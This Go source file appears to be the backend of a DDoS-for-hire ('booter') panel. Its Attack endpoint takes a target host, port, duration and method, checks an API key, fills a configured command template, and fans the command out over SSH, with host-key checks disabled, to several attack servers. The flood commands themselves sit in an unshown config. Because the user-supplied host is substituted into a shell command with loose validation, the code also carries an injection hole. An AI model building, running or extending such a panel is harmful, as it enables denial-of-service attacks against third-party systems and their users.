package includes

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	//"net"
	"os"
	"strconv"
	"strings"

	"github.com/valyala/fasthttp"
	"github.com/asaskevich/govalidator"
	"golang.org/x/crypto/ssh"
)

// Key is the auth key
var Key string

// Config is our configuration
var Config ConfigStruct

var methodscache []string

func getArgStr(ctx *fasthttp.RequestCtx, argname string) (bool, string) {
	value := ctx.FormValue(argname)
	if value == nil {
		return false, ""
	}
	return true, string(value)
}

func getArgInt(ctx *fasthttp.RequestCtx, argname string) (bool, int) {
	value := ctx.FormValue(argname)
	if value == nil {
		return false, 0
	}
	returnValue, err := strconv.Atoi(string(value))
	if err != nil {
		return false, 0
	}
	return true, returnValue
}

// Index is
func Index(ctx *fasthttp.RequestCtx) {
	fasthttp.ServeFile(ctx, "html/index.html")
}

// Attack is our endpoint for sending attacks
func Attack(ctx *fasthttp.RequestCtx) {
	var data AttackRequest
	var err bool
	err, data.Host = getArgStr(ctx, "host")
	if !err {
		sendError("Host is undefined!", ctx)
		return
	}

	err, data.Time = getArgInt(ctx, "time")
	if !err {
		sendError("Time is undefined!", ctx)
		return
	}

	err, data.Port = getArgInt(ctx, "port")
	if !err {
		sendError("Port is undefined!", ctx)
		return
	}

	err, data.Method = getArgStr(ctx, "method")
	if !err {
		sendError("Method is undefined!", ctx)
		return
	}

	// Checking API key
	if !checkKey(ctx) {
		return
	}
	// Method check
	if !methodExists(data.Method) {
		sendError("Invalid method.", ctx)
		return
	}

	// Checking time
	if data.Time > Config.MaxTime || data.Time < 1 {
		sendError("Time must be at least 1 second.", ctx)
		return
	}

	// Checking port
	if data.Port < 1 || data.Port > 65535 {
		sendError("Invalid port!", ctx)
		return
	}
	// Checking if the host is valid
	if !isValidHost(data.Host) {
		sendError("Invalid target set!", ctx)
		return
	}
	// Building and sending command
	var method Method = getMethod(data.Method)

	cmd := buildCommand(method.Command, data)

	for _, server := range Config.Servers {
		for _, subServer := range method.Servers {
			if server.Name == subServer {
				go sendCommand(server, cmd)
			}
		}

	}
	sendSuccess("Attack sent successfully!", ctx)
}

// Reload is our endpoint for reloading the config
func Reload(ctx *fasthttp.RequestCtx) {
	if !checkKey(ctx) {
		return
	}

	data, err := ioutil.ReadFile("config.json")
	if err != nil {
		fmt.Println("Error occured while opening: config.json.\n", err)
		os.Exit(1)
	}
	json.Unmarshal([]byte(data), &Config)
	methodscache = methodscache[:0]
	sendSuccess("Config realoaded successfully!", ctx)
}

// GetMethods is our endpoint for displaying methods
func GetMethods(ctx *fasthttp.RequestCtx) {
	if !checkKey(ctx) {
		return
	}

	if len(methodscache) == 0 {
		methodscache = make([]string, len(Config.Methods))
		for index, method := range Config.Methods {
			methodscache[index] = method.Name
		}
	}
	json.NewEncoder(ctx).Encode(methodscache)

}

func buildCommand(base string, details AttackRequest) string {
	base = strings.Replace(base, "{host}", details.Host, -1)             // Replace host
	base = strings.Replace(base, "{port}", fmt.Sprint(details.Port), -1) // Replace port
	base = strings.Replace(base, "{time}", fmt.Sprint(details.Time), -1) // Replace time
	base = strings.Replace(base, "{method}", details.Method, -1)         // Replace method
	return base
}

func getMethod(methodName string) Method {
	for _, method := range Config.Methods {
		if method.Name == methodName {
			return method
		}
	}
	return Method{}
}

func sendCommand(details Server, command string) {
	sshconf := &ssh.ClientConfig{
		User: details.User,
		Auth: []ssh.AuthMethod{
			ssh.Password(details.Password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	conn, err := ssh.Dial("tcp", details.Host+":"+fmt.Sprint(details.Port), sshconf)
	if err != nil {
		fmt.Println(err)
		return
	}
	session, err := conn.NewSession()
	if err != nil {
		fmt.Println(err)
		return
	}
	session.Run(command)
	session.Close()
}

func isValidHost(host string) bool {
	if !govalidator.IsIPv4(host) {
		return govalidator.IsURL(host)
	}
	return true
}

func methodExists(methodName string) bool {
	for _, method := range Config.Methods {
		if method.Name == methodName {
			return true
		}
	}
	return false
}

func checkKey(ctx *fasthttp.RequestCtx) bool {
	err, usedKey := getArgStr(ctx, "key")
	if !err {
		sendError("No key defined!", ctx)
		return false
	}
	if string(usedKey) != Key {
		sendError("Invalid API key used!", ctx)
		return false
	}
	return true
}

func sendSuccess(message string, ctx *fasthttp.RequestCtx) {
	json.NewEncoder(ctx).Encode(StatusResponse{
		Status:  true,
		Message: message})
}

func sendError(message string, ctx *fasthttp.RequestCtx) {
	json.NewEncoder(ctx).Encode(StatusResponse{
		Status:  false,
		Message: message})
}
